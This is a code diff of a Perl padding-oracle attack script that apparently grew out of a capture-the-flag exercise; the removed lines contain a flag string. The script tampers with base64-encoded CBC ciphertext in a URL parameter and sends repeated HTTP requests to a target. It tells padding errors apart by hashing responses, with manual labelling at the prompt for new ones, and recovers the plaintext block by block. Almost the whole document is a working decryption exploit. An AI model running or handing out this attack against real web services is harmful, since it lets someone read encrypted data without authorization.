@@ -7,11 +7,13 @@ use URI::Escape;#  http://search.cpan.org/perldoc/URI::Escape
 use Encode qw(decode encode);
 use List::MoreUtils qw(any);
 use Config::Tiny; # https://metacpan.org/pod/Config::Tiny
+use Digest::SHA  qw(sha256_base64); # https://metacpan.org/pod/Digest::SHA1; other hashing functions??
 
 print "Ich beginne\n";
 
-my $url, my $parm, my $bSize, my $URLEncoding;
-
+# Variable initializations
+my @text = (), my @guuud = (), my @paddingErrors = ();
+my $url, my $parm, my $bSize, my $URLEncoding, my $AIM;
 my $file = "./options.config";
 my $config = Config::Tiny->read($file);
 if ($config){
@@ -30,25 +32,13 @@ if ($config){
     $config->write($file);
 }
 
-#my @wante = ('ValueError: Padding is incorrect.', 'ValueError: PKCS#7 padding is incorrect.');
-
-#my @wante = ('Padding', 'Incorrect amount of PKCS#7');
-
-my @wante = ('^FLAG^1d6c98018131f055d327e9e6eeb7ac26e69cdeb3b3cc90b1bd3f36a1fb15c135$FLAG$', 'padding', 'Incorrect');
-
-my $AIM = 0;
-
-my @text = ();
-
 #$parm =~ s/-/+/ig;
 #$parm =~ s/!/\//ig;
 #$parm =~ s/~/=/ig;
-
 $parm = uri_unescape($parm);
-
 $parm = decode_base64($parm);
-
 my $qLen = length($parm)-1;
+#
 
 print "String Length: ".$qLen."\n";
 
@@ -60,7 +50,7 @@ my $currentB = $qLen-($bSize+$it);
 substr($tempPARM, $currentB, 1) = chr(ord(substr($tempPARM, $currentB, 1))^255);
 my $return = getRequest($tempPARM);
 my $limit = 0;
-if ($return == 1){$it = 0; $limit = 5;}else{$it = $it + 2; $limit = 17;} # edit this to reflect changes of the #bSize variable
+if ($return == 1){$it = 0; $limit = 5;}else{$it = $it + 2; $limit = 17;} # edit this to reflect changes of the #bSize variable (amoung others)
 
 while ($it < $limit){
     $tempPARM = $parm;
@@ -101,12 +91,11 @@ while ($ill < $AIM){
 
 my $target = 0;
 my $bNum = ($qLen+1)/$bSize;
-print "\nPadding Size: $AIM\n\nNumber of Blocks: $bNum\n";
+print "\nInitial Padding Size = $AIM, Number of Blocks = $bNum\n\n";
 my $bt = 0;
 while ($bt < $bNum){
     $target = $AIM+1;
     $it = $AIM;
-    print "block = $bt\n";
     while($it < $bSize){
         $tempPARM = $parm;
         prep( );
@@ -128,26 +117,28 @@ while ($bt < $bNum){
                 $byte = ($byte + 1)%255; 
             }
         }
+        print 1+$it."/$bSize\n";
         $it++;
     }
+     printf ("\nBlock %d Complete\n", 1+$bt);
     $qLen = $qLen-$bSize;
-    $parm = substr($parm,  0, $qLen+1); # Add 1 because it starts from 1 instead of 0.
+    $parm = substr($parm,  0, $qLen+1); # Added 1 because it starts from 1 instead of 0.
     $bt++;
     $AIM = 0;
     my @plainText = reverse(@text);
     foreach( @plainText ){
         print chr($_);
     } 
-print "\n\n";
 }
-print "\n";
 
-print "done\n";
+print "Attack Complete! Your plain text: \n";
 my @plainText = reverse(@text);
 foreach( @plainText ){
     print chr($_);
-} 
-print "\n\n";
+}
+print "\n";
+
+# End -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 sub prep { # Prep paddings (turns something like \x03\x03\x03 to \x04\x04\x04)
     my $tilAIM = 0;
@@ -161,10 +152,28 @@ sub prep { # Prep paddings (turns something like \x03\x03\x03 to \x04\x04\x04)
 sub getRequest {
     my $heel = uri_escape(encode_base64($_[0], ''));
     my $response = HTTP::Tiny->new->get($url.$heel);
-    if (not any {$response->{content} =~ $_ } @wante){
-        return 1;
-    }
-    else{
+    my $htmlResponse = sha256_base64($response->{content});
+    if ( grep { $_ eq $htmlResponse } @paddingErrors ){
         return 0;
+    }elsif( grep { $_ eq $htmlResponse } @guuud ){
+        return 1;
+    }else{
+        my $uinput;
+        while(1){
+            print "\n$url$heel\n\n1 = Padding Error\n2 = Other\n3 = Similar to previous\nEnter your choice: ";
+            chomp ($uinput = <STDIN>);
+            $uinput = $uinput+0; # Make this better
+            if ($uinput == 2){
+                push @guuud, $htmlResponse;
+                return 1;
+            }elsif ($uinput == 1){
+                push @paddingErrors, $htmlResponse;
+                $uinput++; #horrible change this
+                return 0;
+            }else{
+                print "\nPlease input either \"1\",  \"2\", or \"3\" (You typed: $uinput)\n\n";
+                next;
+                }
+        }
     }
 }
